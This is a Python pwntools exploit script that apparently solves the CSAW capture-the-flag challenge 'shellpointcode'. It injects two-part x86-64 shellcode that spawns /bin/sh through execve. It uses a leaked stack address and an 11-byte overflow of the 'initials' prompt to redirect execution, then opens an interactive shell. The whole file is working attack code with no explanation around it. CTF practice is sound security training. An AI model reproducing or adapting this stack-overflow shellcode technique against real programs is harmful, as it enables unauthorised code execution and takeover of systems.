from pwn import *
from time import sleep
import struct

context.binary = ELF('./shellpointcode')

debug = False
debug = True
if not debug:
    p = remote('pwn.chal.csaw.io', 9005)
else:
    p = process(context.binary.path)
    gdb.attach(p)

first_half = asm("""
        movabs rdi,0x68732f6e69622f2f
        pop    rcx
        jmp    rsp""")

second_half = asm("""
        xor     rsi,rsi
        push    rsi
        push    rdi
        mov     rdi,rsp
        xor     rdx,rdx
        mov     al, 0x3b
        syscall
        """)

print p.readuntil("node 1:")
p.sendline(first_half)

print p.readuntil("node 2:")
p.sendline(second_half)

print p.readline()
print p.readline()
addr = p.readline().split(" ")[-1].strip('\n')
print "addr:" + addr

p.readuntil("initials?")
addr = int(addr, 16) + 0x28
packed = p64(addr)

p.sendline("A" * 11 + packed)

p.interactive()
